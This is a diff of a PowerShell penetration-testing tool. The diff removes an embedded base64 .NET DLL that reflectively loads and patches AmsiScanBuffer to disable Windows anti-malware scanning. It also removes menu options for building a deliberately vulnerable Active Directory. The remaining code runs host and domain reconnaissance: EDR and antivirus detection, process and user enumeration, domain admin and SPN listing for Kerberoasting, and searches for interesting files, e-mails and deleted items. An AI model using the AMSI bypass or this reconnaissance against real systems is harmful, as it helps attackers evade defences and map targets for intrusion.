@@ -1,74 +1,28 @@
-# Building Powershell script for PT some script wrap into one Script
-# for now there is only inital script
-# add more scripts (such as dump lsass)
-# ms17, bluekeep scans
-# added menu option
-#added amsi-bypass
+$ErrorActionPreference = "SilentlyContinue"
+$Time = (Get-Date)
+[string]$StartTime = $Time|get-date -UFormat "%d-%m-%Y_%H.%M"
 
-function STOP-msi
-{
-    if(-not ([System.Management.Automation.PSTypeName]"Bypass.AMSI").Type) {
-        [Reflection.Assembly]::Load([Convert]::FromBase64String("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N0RBQ0VEAEJ5cGFzc0FNU0kAbXNjb3JsaWIAc3JjAERpc2FibGUAUnVudGltZUZpZWxkSGFuZGxlAENvbnNvbGUAaE1vZHVsZQBwcm9jTmFtZQBuYW1lAFdyaXRlTGluZQBWYWx1ZVR5cGUAQ29tcGlsZXJHZW5lcmF0ZWRBdHRyaWJ1dGUAR3VpZEF0dHJpYnV0ZQBEZWJ1Z2dhYmxlQXR0cmlidXRlAENvbVZpc2libGVBdHRyaWJ1dGUAQXNzZW1ibHlUaXRsZUF0dHJpYnV0ZQBBc3NlbWJseVRyYWRlbWFya0F0dHJpYnV0ZQBUYXJnZXRGcmFtZXdvcmtBdHRyaWJ1dGUAQXNzZW1ibHlGaWxlVmVyc2lvbkF0dHJpYnV0ZQBBc3NlbWJseUNvbmZpZ3VyYXRpb25BdHRyaWJ1dGUAQXNzZW1ibHlEZXNjcmlwdGlvbkF0dHJpYnV0ZQBDb21waWxhdGlvblJlbGF4YXRpb25zQXR0cmlidXRlAEFzc2VtYmx5UHJvZHVjdEF0dHJpYnV0ZQBBc3NlbWJseUNvcHlyaWdodEF0dHJpYnV0ZQBBc3NlbWJseUNvbXBhbnlBdHRyaWJ1dGUAUnVudGltZUNvbXBhdGliaWxpdHlBdHRyaWJ1dGUAQnl0ZQBkd1NpemUAc2l6ZQBTeXN0ZW0uUnVudGltZS5WZXJzaW9uaW5nAEFsbG9jSEdsb2JhbABNYXJzaGFsAEtlcm5lbDMyLmRsbABCeXBhc3NBTVNJLmRsbABTeXN0ZW0AU3lzdGVtLlJlZmxlY3Rpb24Ab3BfQWRkaXRpb24AWmVybwAuY3RvcgBVSW50UHRyAFN5c3RlbS5EaWFnbm9zdGljcwBTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMAU3lzdGVtLlJ1bnRpbWUuQ29tcGlsZXJTZXJ2aWNlcwBEZWJ1Z2dpbmdNb2RlcwBSdW50aW1lSGVscGVycwBCeXBhc3MAR2V0UHJvY0FkZHJlc3MAbHBBZGRyZXNzAE9iamVjdABscGZsT2xkUHJvdGVjdABWaXJ0dWFsUHJvdGVjdABmbE5ld1Byb3RlY3QAb3BfRXhwbGljaXQAZGVzdABJbml0aWFsaXplQXJyYXkAQ29weQBMb2FkTGlicmFyeQBSdGxNb3ZlTWVtb3J5AG9w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")) | Out-Null
-        Write-Output "DLL has been reflected";
-    }
-    [Bypass.AMSI]::Disable()
-}
-STOP-msi
-sleep 1
+# Create filename for HTMLReport
 
-function Show-Menu {
-    param (
-        [string]$Title = 'M00min - PT assistance script'
-    )
-    Clear-Host
+[string]$Hostname = $ENV:COMPUTERNAME
+[string]$FileName ="InitalScript_" + $StartTime + '_' + $Hostname + '.html'
+$HTMLReportFile = (Join-Path $PWD $FileName)
 
-    Write-Host "================ $Title ================"
-    Write-Host "[+] 1: Press '1' to Inital Script - Simpale Host and Domian Enumeration."
-    Write-Host "[+] 2: Press '2' to Join Machine to domain."
-    Write-Host "[+] 3: Press '3' to Install AD (Run on DC)."
-    Write-Host "[+] 4: Press '4' to Configure Vulnerable AD (Run on DC)."
-    Write-Host "[+] 5: Press '5' to Start User Simulator (Run on DC)."
-
-    Write-Host "[+] R: Press 'R' to Generate Report For Your Active Directory (Run on DC)."
-    Write-Host "[+] Q: Press 'Q' to quit."
-}
-
-
-
-
-function Inital-Script {
-    $ErrorActionPreference = "SilentlyContinue"
-    $Time = (Get-Date)
-    [string]$StartTime = $Time|get-date -UFormat "%d-%m-%Y_%H.%M"
-
-    # Create filename for HTMLReport
-
-    [string]$Hostname = $ENV:COMPUTERNAME
-    [string]$FileName ="InitalScript_" + $StartTime + '_' + $Hostname + '.html'
-    $HTMLReportFile = (Join-Path $PWD $FileName)
-
-    # Header for HTML table formatting
+# Header for HTML table formatting
     
-    $HTMLReportHeader =@"
+$HTMLReportHeader =@"
     <style>
-
         h1 {
-
             font-family: Arial, Helvetica, sans-serif;
             color: #e68a00;
             font-size: 28px;
-
         }
-
     
         h2 {
-
             font-family: Arial, Helvetica, sans-serif;
             color: #000099;
             font-size: 16px;
-
         }
-
     
     
        table {
@@ -92,37 +46,23 @@ function Inital-Script {
             padding: 10px 15px;
             vertical-align: middle;
 	    }
-
         tbody tr:nth-child(even) {
             background: #f0f0f2;
         }
     
-
-
         #CreationDate {
-
             font-family: Arial, Helvetica, sans-serif;
             color: #ff3300;
             font-size: 12px;
-
         }
-
-
-
         .StopStatus {
-
             color: #ff0000;
         }
     
   
         .RunningStatus {
-
             color: #008000;
         }
-
-
-
-
     </style>
 "@
 
@@ -141,11 +81,11 @@ function Inital-Script {
     "[+] STARTTIME:`t$StartTime"
     "[+] PID:`t$PID`n"
 
-    function Get-EDRCheck{
+function Get-EDRCheck{
 
-        Function Obj{
-            Param([Parameter(Mandatory=1)][HashTable]$Props)
-            Return New-Object PSCustomObject -Property $Props
+    Function Obj{
+        Param([Parameter(Mandatory=1)][HashTable]$Props)
+        Return New-Object PSCustomObject -Property $Props
         }
         # Driver Check
         $Result = Switch ((Get-ChildItem $env:SystemDrive\Windows\System32\drivers | where  Name -match .sys$).name){
@@ -240,12 +180,10 @@ function Inital-Script {
         else{Return $Result}
     }
 
-    function Get-SysInfo {
+function Get-SysInfo {
     <#
     .SYNOPSIS
-
     Gets basic system information from the host
-
     #>
         $os_info = gwmi Win32_OperatingSystem
         $uptime = [datetime]::ParseExact($os_info.LastBootUpTime.SubString(0,14), "yyyyMMddHHmmss", $null)
@@ -287,47 +225,42 @@ function Inital-Script {
     }
 
 
-    function Get-ProcessInfo() {
+function Get-ProcessInfo() {
     <#
     .SYNOPSIS
-
     Gets detailed process information via WMI
-
     #>
     # Extra work here to include process owner and commandline using WMI
-        Write-Verbose "Enumerating running processes..."
-        $owners = @{}
-        $commandline = @{}
+    Write-Verbose "Enumerating running processes..."
+    $owners = @{}
+    $commandline = @{}
 
-        gwmi win32_process |% {$owners[$_.handle] = $_.getowner().user}
-        gwmi win32_process |% {$commandline[$_.handle] = $_.commandline}
+    gwmi win32_process |% {$owners[$_.handle] = $_.getowner().user}
+    gwmi win32_process |% {$commandline[$_.handle] = $_.commandline}
 
-        $procs = Get-Process | Sort-Object -property ID
-        $procs | ForEach-Object {$_|Add-Member -MemberType NoteProperty -Name "Owner" -Value $owners[$_.id.tostring()] -force}
-        $procs | ForEach-Object {$_|Add-Member -MemberType NoteProperty -Name "CommandLine" -Value $commandline[$_.id.tostring()] -force}
+    $procs = Get-Process | Sort-Object -property ID
+    $procs | ForEach-Object {$_|Add-Member -MemberType NoteProperty -Name "Owner" -Value $owners[$_.id.tostring()] -force}
+    $procs | ForEach-Object {$_|Add-Member -MemberType NoteProperty -Name "CommandLine" -Value $commandline[$_.id.tostring()] -force}
 
-        Return $procs
+    Return $procs
     }
 
 
-    function Get-LocalUsers {
+ function Get-LocalUsers {
     <#
     .SYNOPSIS
     Pulls local users and some of their properties.
-
     .DESCRIPTION
     Uses the [ADSI] object type to query user objects for group membership, password expiration, etc
-
     .LINK
     This function borrows the ADSI code from the following link:
     http://www.bryanvine.com/2015/08/powershell-script-get-localusers.html
-
     #>
 
-        $LocalUsers = Get-WmiObject -Class Win32_UserAccount -Filter "Domain='$($env:ComputerName)'"
+    $LocalUsers = Get-WmiObject -Class Win32_UserAccount -Filter "Domain='$($env:ComputerName)'"
 
-        # Pull some additional properties that we don't get through Win32_UserAccount
-        $LocalUserProps = ([ADSI]"WinNT://$env:computerName").Children | ?{$_.SchemaClassName -eq 'user'} | %{
+    # Pull some additional properties that we don't get through Win32_UserAccount
+    $LocalUserProps = ([ADSI]"WinNT://$env:computerName").Children | ?{$_.SchemaClassName -eq 'user'} | %{
             $_ | Select @{n='UserName';e={$_.Name}},
             @{n='Disabled';e={if(($_.userflags.value -band 2) -eq 2){$true} else{$false}}},
             @{n='PasswordExpired';e={if($_.PasswordExpired){$true} else{$false}}},
@@ -352,12 +285,10 @@ function Inital-Script {
     }
 
 
-    function Get-UserGroupMembership {
+function Get-UserGroupMembership {
     <#
     .SYNOPSIS
-
     Pulls local group membership for the current user
-
     #>
         Write-Verbose "Enumerating current user local group membership..."
 
@@ -375,14 +306,12 @@ function Inital-Script {
     }
 
 
-    function Get-ActiveTCPConnections {
+function Get-ActiveTCPConnections {
     <#
     .SYNOPSIS
-
     Enumerates active TCP connections for IPv4 and IPv6
     Adapted from Beau Bullock's TCP code
     https://raw.githubusercontent.com/dafthack/HostRecon/master/HostRecon.ps1
-
     #>
         Write-Verbose "Enumerating active network connections..."
         $IPProperties = [System.Net.NetworkInformation.IPGlobalProperties]::GetIPGlobalProperties()
@@ -401,10 +330,9 @@ function Inital-Script {
     }
 
 
-    function Get-ActiveListeners {
+function Get-ActiveListeners {
     <#
     .SYNOPSIS
-
     Enumerates active TCP/UDP listeners.
     #>
         Write-Verbose "Enumerating active TCP/UDP listeners..."
@@ -432,12 +360,10 @@ function Inital-Script {
         }
     }
 
-    function Get-FirewallStatus {
+function Get-FirewallStatus {
     <#
     .SYNOPSIS
-
     Enumerates local firewall status from registry
-
     #>
         $regkey = "HKLM:\System\ControlSet001\Services\SharedAccess\Parameters\FirewallPolicy"
         New-Object -TypeName PSobject -Property @{
@@ -445,10 +371,10 @@ function Inital-Script {
             Domain      = If ((Get-ItemProperty $regkey\DomainProfile).EnableFirewall -eq 1){"Enabled"}Else {"Disabled"}
             Public      = If ((Get-ItemProperty $regkey\PublicProfile).EnableFirewall -eq 1){"Enabled"}Else {"Disabled"}
         }
-    }
+}
 
 
-    function Get-InterestingRegistryKeys {
+function Get-InterestingRegistryKeys {
     <#
     .SYNOPSIS
     Pulls potentially interesting registry keys
@@ -490,15 +416,14 @@ function Inital-Script {
         Get-ChildItem registry::HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies -recurse | Out-String
         Get-ChildItem registry::HKEY_CURRENT_USER\Software\Policies -recurse | Out-String
         Get-ChildItem registry::HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies -recurse | Out-String
-    }
+}
 
 
-    function Get-IndexedFiles {
+function Get-IndexedFiles {
     <#
     .SYNOPSIS
     Uses the Windows indexing service to search for interesting files and often includes Outlook e-mails.
     Code originally adapted from a Microsoft post, but can no longer locate the exact source. Doesn't work on all systems.
-
     #>
     param (
         [Parameter(Mandatory=$true)][string]$Pattern)
@@ -522,15 +447,13 @@ function Inital-Script {
             $rs.Fields.Item("System.ItemPathDisplay").Value
             $rs.MoveNext()
         }
-    }
+}
 
 
-    function Get-InterestingFiles {
+function Get-InterestingFiles {
     <#
     .SYNOPSIS
-
     Local filesystem enumeration
-
     #>
         Write-Verbose "Enumerating interesting files..."
 
@@ -579,15 +502,13 @@ function Inital-Script {
         # Get Host File
         "`n[+] Contents of Hostfile:`n`n"
         (Get-Content -path "$($ENV:WINDIR)\System32\drivers\etc\hosts") -join "`r`n"
-    }
+}
 
 
-    function Get-RecycleBin {
+function Get-RecycleBin {
     <#
     .SYNOPSIS
-
     Gets the contents of the Recycle Bin for the current user
-
     #>
         Write-Verbose "Enumerating deleted files in Recycle Bin..."
         Try {
@@ -601,14 +522,12 @@ function Inital-Script {
         Catch {Write-Verbose "[-] Error getting deleted items from Recycle Bin! $($Error[0])`n"}
 
         Return $Output
-    }
+}
 
-    function Get-AVInfo {
+function Get-AVInfo {
     <#
     .SYNOPSIS
-
     Gets the installed AV product and current status
-
     #>
         Write-Verbose "Enumerating installed AV product..."
 
@@ -644,15 +563,13 @@ function Inital-Script {
         $Output = New-Object -TypeName PSObject -Property $ht #|Format-List
 
         Return $Output
-    }
+}
 
 
-    function Get-McafeeLogs {
+function Get-McafeeLogs {
     <#
     .SYNOPSIS
-
     Searches Application log for "McLogEvent" Provider associated with McAfee AV products and selects the first 50 events from the last 14 days
-
     #>
         Write-Verbose "Enumerating Mcafee AV events..."
         # Get events from the last two weeks
@@ -664,18 +581,15 @@ function Inital-Script {
             $McafeeLogs |Select-Object -First 50 ID, Providername, DisplayName, TimeCreated, Level, UserID, ProcessID, Message
         }
         Catch {Write-Verbose "[-] Error getting McAfee AV event logs! $($Error[0])`n"}
-    }
+}
 
 
-    function Get-AVProcesses {
+function Get-AVProcesses {
     <#
     .SYNOPSIS
-
     Returns suspected AV processes based on name matching
-
     AV process list adapted from Beau Bullock's HostRecon AV detection code
     https://raw.githubusercontent.com/dafthack/HostRecon/master/HostRecon.ps1
-
     #>
         Write-Verbose "Enumerating potential AV processes..."
         $processes = Get-Process
@@ -722,12 +636,10 @@ function Inital-Script {
         }
     }
 
-    function Get-DomainAdmins {
+function Get-DomainAdmins {
     <#
     .SYNOPSIS
-
     Enumerates admininistrator type accounts within the domain using code adapted from Dafthack HostRecon.ps1
-
     #>
         Write-Verbose "Enumerating Domain Administrators..."
         $Domain = [System.Directoryservices.Activedirectory.Domain]::GetCurrentDomain()
@@ -758,10 +670,10 @@ function Inital-Script {
             $MemberNames
         }
         Catch {Write-Verbose "[-] Error connecting to the domain while retrieving group members."}
-    }
+}
 
 
-    function Get-DomainAccountPolicy {
+function Get-DomainAccountPolicy {
     <#
     .SYNOPSIS
     Enumerates account policy from the domain with code adapted from Dafthack HostRecon.ps1
@@ -786,11 +698,11 @@ function Inital-Script {
             $CurrentDomain | Select-Object $Name,$MinPassLen,$MinPassAge,$MaxPassAge,$PassHistory,$AcctLockoutThreshold,$AcctLockoutDuration,$ResetAcctLockoutCounter
         }
         Catch {Write-Verbose "[-] Error connecting to the domain while retrieving password policy."}
-    }
+}
 
 
 
-    function Get-UserSPNS {
+function Get-UserSPNS {
     <#
     .SYNOPSIS
     # Edits by Tim Medin
@@ -883,7 +795,7 @@ function Inital-Script {
                 }
             }
         }
-    }
+}
 
 
     # Execute local enumeration functions and format for report
@@ -1222,25 +1134,4 @@ function Inital-Script {
     "[+] FILESIZE:`t$((Get-Item $HTMLReportFile).length) Bytes"
     "[+] DURATION:`t$Duration"
     "[+] InitalScript Complete!"
-}
 
-
-
-do {
-
-    Show-Menu –Title 'M00min'
-    $input = Read-Host -Prompt "`n[?] What do you want to do ?"
-    switch ($input) {
-        '1' { Inital-Script }
-        '2' { Join2Domain }
-        '3' { Config-AD }
-        '4' { Vulnerable-AD }
-        '5' { Users-Simulate }
-
-
-        'R' { Vuln-ADReport }
-        'q' {Clear-Host;return }
-    }
-    pause
-
-} until ($input -eq 'q');
